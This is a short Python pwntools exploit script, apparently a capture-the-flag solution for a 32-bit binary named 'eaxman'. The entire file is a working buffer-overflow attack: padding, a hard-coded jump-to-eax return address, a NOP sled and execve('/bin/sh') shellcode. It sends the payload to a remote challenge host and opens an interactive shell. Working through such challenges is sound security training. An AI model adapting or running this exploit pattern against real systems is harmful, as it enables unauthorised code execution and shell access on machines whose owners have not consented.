from pwn import *

def main():
	jmp_eax = p32(0x0804918f)

	jmp_esp_inst = b'\x90\x90\xff\xe4'

	padding = b'A' * (44 - len(jmp_esp_inst))

	# http://shell-storm.org/shellcode/files/shellcode-811.php
	shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"
	shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
	shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
	shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"

	nopsled = b'\x90' * 20

	payload = jmp_esp_inst + padding + jmp_eax + nopsled + shellcode

	#io = process('./eaxman')
	io = remote("challenge.ctf-fun.xyz", 14015)
	io.sendline(payload)
	io.interactive()

if __name__ == '__main__':
	main()